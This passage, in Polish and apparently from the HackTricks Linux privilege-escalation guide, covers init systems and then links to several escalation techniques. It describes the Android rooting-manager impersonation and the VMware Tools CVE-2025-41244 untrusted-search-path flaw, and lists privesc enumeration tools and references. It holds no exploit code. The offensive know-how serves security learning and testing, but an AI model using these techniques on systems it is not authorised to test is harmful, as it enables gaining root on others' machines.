Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Znajdują się w nim skrypty do `start`, `stop`, `restart`, a czasami także `reload` usług. Można uruchamiać je bezpośrednio lub za pośrednictwem dowiązań symbolicznych znajdujących się w `/etc/rc?.d/`. W systemach Redhat stosowana jest również ścieżka `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, który wykorzystuje pliki konfiguracyjne do zarządzania usługami. Mimo przejścia na Upstart skrypty SysVinit nadal są używane równolegle z konfiguracjami Upstart dzięki warstwie zgodności w Upstart.

**systemd** to nowoczesny system inicjalizacji i menedżer usług oferujący zaawansowane funkcje, takie jak uruchamianie demonów na żądanie, zarządzanie automatycznym montowaniem oraz migawki stanu systemu. Pliki dystrybucyjnych pakietów przechowuje w `/usr/lib/systemd/`, a pliki zmieniane przez administratorów — w `/etc/systemd/system/`, usprawniając tym samym administrację systemem.<sup>[[21]](#references)</sup>

## Inne sztuczki

### **Eskalacja uprawnień NFS**


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Ucieczka z ograniczonych powłok


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Frameworki rootujące Androida: nadużycie kanału managera

Frameworki rootujące Androida często przechwytują syscall, aby udostępnić uprzywilejowane funkcje jądra managerowi działającemu w userspace. Słabe uwierzytelnianie managera (np. weryfikacja sygnatury oparta na kolejności FD lub słabe schematy haseł) może pozwolić lokalnej aplikacji podszyć się pod managera i uzyskać uprawnienia root na urządzeniach, które mają już root. Więcej informacji i szczegóły dotyczące exploita znajdziesz tutaj:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## LPE przez wykrywanie usług VMware Tools z użyciem exec opartego na regex (CWE-426, CVE-2025-41244)

Wykrywanie usług oparte na regex w VMware Tools/Aria Operations może wyodrębnić ścieżkę pliku binarnego z wierszy poleceń procesów, a następnie uruchomić go z argumentem -v w kontekście uprzywilejowanym. Zbyt liberalne wzorce (np. wykorzystujące \S) mogą dopasować listener umieszczony przez atakującego w zapisywalnej lokalizacji (np. /tmp/httpd), co może doprowadzić do uruchomienia kodu jako root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Więcej informacji oraz uogólniony wzorzec, który można zastosować do innych stosów wykrywania i monitorowania, znajdziesz tutaj:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Zabezpieczenia jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Narzędzia Privesc dla Linux/Unix

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Linuksie:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wylicza luki w jądrze Linuksa i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zbiór dodatkowych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (eskalacja uprawnień przez interfejs crontab, ponowne użycie danych logowania zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: sfałszowany payload .text_sig dla monitorowania uruchamianego przez cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: obejście Neighborhood Watch (przejęcie PATH przez sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Podstawy eskalacji uprawnień w Linuksie](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Przewodnik po eskalacji uprawnień w Linuksie](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Atak i obrona: techniki eskalacji uprawnień w Linuksie z 2016 roku](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Nikt nie spodziewa się wykonania polecenia!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (eskalacja uprawnień w Linuksie)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – omówienie ćwiczeń laboratoryjnych - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: wskazówki i sztuczki dotyczące eskalacji uprawnień w Linuksie](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: narzędzie do enumeracji i eskalacji uprawnień w Linuksie](https://github.com/rtcrowley/linux-private-i)
- [14] [Czym jest socket?](https://www.linux.com/news/what-socket/)
- [15] [Omówienie Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Poznaj D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Eskalacja uprawnień w Linuksie przez pliki wykonywalne SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, część 2 – eskalacja uprawnień w Linuksie](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jak zarządzać ACL w Linuksie](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS: uzyskanie uprawnień root przez network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Czym jest systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (wstrzyknięcie arytmetyczne w bashu przez logi, pełny łańcuch)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Podręcznik GNU Bash – BASH_ENV (plik startowy dla trybu nieinteraktywnego)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + eskalacja uprawnień przez dowiązanie symboliczne TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiowanie przez cron pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Nazwij to, a VMware podniesie uprawnienia (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: eskalacja uprawnień przez sudo chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – luki w sudo umożliwiające eskalację uprawnień: CVE-2025-32462 i CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – katalogi repozytorium PYC](https://peps.python.org/pep-3147/)
- [32] [Dokumentacja Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit, zgłoszenie nr 74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet użytkownika @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Rejestrowanie haseł w Linuksie](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Szczegóły wyścigu w logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Dokumentacja Python 3.10 – `site` i pliki konfiguracji ścieżek](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
